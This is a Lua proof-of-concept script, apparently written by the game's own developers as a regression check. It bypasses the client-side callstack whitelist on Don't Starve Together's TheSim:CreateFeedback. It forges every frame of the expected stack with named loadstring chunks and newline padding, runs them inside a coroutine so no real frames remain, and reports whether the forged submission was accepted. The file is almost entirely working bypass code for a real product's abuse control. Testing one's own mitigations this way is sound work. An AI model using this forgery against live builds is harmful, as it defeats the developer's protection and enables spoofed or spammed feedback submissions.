--[[============================================================================
 POC: feedbackspoof -- forged Lua callstack bypass of the CreateFeedback whitelist

 SCOPE / AUTHORIZATION (Phase 0)
 -------------------------------
 Defensive. Target is our own game (Don't Starve Together) and our own feedback
 endpoint. "Bypass", "spoof", "forge" and "attacker" below describe the defect
 class being closed, not an intent to use it against anyone. This script exists
 to give the mitigation in whitelist_prevent.md a reliable on/off regression
 check: run it before the fix (submission is accepted) and after the fix
 (submission is rejected).

 WHAT IT DOES
 ------------
 SimLuaProxy::CreateFeedback (source/simlib/simluaproxy.cpp:5092) gates feedback
 on two client-side checks:
   1. a 60-second cooldown (mLastFeedbackTime, line 5096), and
   2. an exact Lua callstack match against a hardcoded golden string
      (validstackCreateFeedback, line 5089), captured by getluastack
      (source/simlib/simulation.cpp:2483).

 getluastack serializes only `short_src:currentline` per frame and replaces
 every `"` with `'`. Both fields are attacker-controlled: `short_src` comes from
 the chunk name passed to loadstring, and `currentline` comes from where the
 call physically sits in the source. This script rebuilds the entire golden
 stack from forged chunks and calls TheSim:CreateFeedback through it, so check #2
 passes even though the call never came from the feedback screen or the input
 handler.

 A naive forge fails: getluastack walks the whole stack to the bottom, so the
 real invocation frames (console / mod entry) would remain underneath and break
 the exact match. The escape hatch is a coroutine -- lua_getstack only walks the
 current thread's stack, and a coroutine's stack starts at its entry function,
 so nothing real sits beneath the forged frames.

 PRECONDITIONS
 -------------
 - A client build with FEEDBACK_ENABLED, on branch "staging", not dedicated
   (IsFeedbackEnabled, simluaproxy.cpp:1403) -- the same builds where the real
   feedback screen works and TheSim:CreateFeedback is not nil'd out.
 - On STEAM / RAIL builds ENABLE_CALLSTACK_CHECKS is on (simluaproxy.cpp:5080),
   so the whitelist is actually enforced and this POC is meaningful. On other
   builds the check is compiled out (isValidStack is always true) and any direct
   call already "passes".
 - Run in an environment that exposes TheSim, loadstring, and coroutine
   (the in-game Lua console, or a mod's context).

 ISOLATING THE RESULT
 --------------------
 CreateFeedback returns "" for BOTH a cooldown rejection and a whitelist
 rejection. To make "" mean "whitelist rejected it" (i.e. the fix works), run
 this as the FIRST feedback submission of the session, or after a 60s idle, so
 the cooldown is not the thing saying no. See POC.run() output.

 Lua 5.1.4 (embedded). loadstring(src, chunkname) is the 5.1 signature.
==============================================================================]]

local loadfn = loadstring or load  -- 5.1: loadstring(str, name); fallback for 5.2+

-- Golden stack, innermost (depth 1, just under the [C] CreateFeedback frame) to
-- outermost (depth 9, the coroutine entry). Must match validstackCreateFeedback
-- frame-for-frame. `leaf` is the frame that makes the actual C call.
local FRAMES = {
    { name = "scripts/screens/redux/feedbackscreen.lua", line = 295, leaf = true },
    { name = "scripts/screens/redux/feedbackscreen.lua", line = 223 },
    { name = "scripts/widgets/imagebutton.lua",          line = 216 },
    { name = "scripts/widgets/widget.lua",               line = 130 },
    { name = "scripts/widgets/widget.lua",               line = 130 },
    { name = "scripts/screens/redux/feedbackscreen.lua", line = 248 },
    { name = "scripts/frontend.lua",                     line = 440 },
    { name = "scripts/input.lua",                        line = 166 },
    { name = "scripts/input.lua",                         line = 752 },
}

-- Build one forged frame.
--   * The returned function's short_src is `spec.name` because loadstring's
--     chunk name (no @ or = prefix) renders as [string "spec.name"].
--   * Padding with (line-1) newlines puts the call statement on exactly the
--     target line, so currentline reports it.
--   * Calls are STATEMENTS, never `return f()` -- a tail call would splice out
--     this frame and break the match.
local function build_frame(spec, inner_index)
    local body
    if spec.leaf then
        -- Non-tail call so this frame stays on the stack as [string
        -- 'feedbackscreen.lua']:295 while CreateFeedback runs at depth 0.
        body = "return function(chain, ctx) local r = TheSim:CreateFeedback("
            .. "ctx[1],ctx[2],ctx[3],ctx[4],ctx[5],ctx[6],ctx[7],ctx[8],ctx[9],ctx[10]) ctx.result = r end"
    else
        body = ("return function(chain, ctx) chain[%d](chain, ctx) end"):format(inner_index)
    end
    local src = string.rep("\n", spec.line - 1) .. body
    local chunk = assert(loadfn(src, spec.name))
    return chunk()
end

local function build_chain()
    local chain = {}
    for i = 1, #FRAMES do
        chain[i] = build_frame(FRAMES[i], i - 1)  -- non-leaf i calls chain[i-1]
    end
    return chain
end

local POC = {}

-- Submit one feedback report through the forged stack.
-- Returns the CreateFeedback result string (or nil on a coroutine error).
function POC.submit_forged(subject, details)
    local chain = build_chain()
    local ctx = {
        subject or "feedbackspoof POC",      -- 1 title
        details or "forged-callstack test",  -- 2 message
        "Anonymous",                          -- 3 name
        "OTHER",                              -- 4 category
        "",                                   -- 5 gamestatus
        "",                                   -- 6 infodotlua
        1,                                    -- 7 emoticon (1-indexed)
        false,                                -- 8 save
        false,                                -- 9 screenshot
        false,                                -- 10 log
        result = nil,
    }

    -- chain[#FRAMES] (input.lua:752) is the outermost frame == the coroutine
    -- body. Its stack is self-contained, so getluastack sees only forged frames.
    local co = coroutine.create(chain[#FRAMES])
    local ok, err = coroutine.resume(co, chain, ctx)
    if not ok then
        print("[feedbackspoof] coroutine error:", tostring(err))
        return nil
    end
    return ctx.result
end

-- Control: call CreateFeedback straight from here, no forged stack. On an
-- enforcing build this must be rejected (returns ""). NOTE: this arms the 60s
-- cooldown, so do not run it right before submit_forged if you want a clean
-- whitelist reading.
function POC.submit_direct(subject, details)
    return TheSim:CreateFeedback(
        subject or "feedbackspoof POC (direct)",
        details or "direct call, unforged stack",
        "Anonymous", "OTHER", "", "", 1, false, false, false)
end

-- Convenience runner with interpretation of the result.
function POC.run()
    local res = POC.submit_forged()
    print("[feedbackspoof] forged-stack submit -> result = " .. string.format("%q", tostring(res)))
    if res == nil then
        print("[feedbackspoof] RESULT: INDETERMINATE (coroutine error above)")
    elseif res == "" then
        print("[feedbackspoof] RESULT: REJECTED -- whitelist mitigation active,")
        print("[feedbackspoof]         OR the 60s cooldown fired. Re-run as the first")
        print("[feedbackspoof]         submission of the session / after 60s to disambiguate.")
    else
        print("[feedbackspoof] RESULT: ACCEPTED -- whitelist BYPASSED. Saved archive: " .. res)
    end
    return res
end

return POC
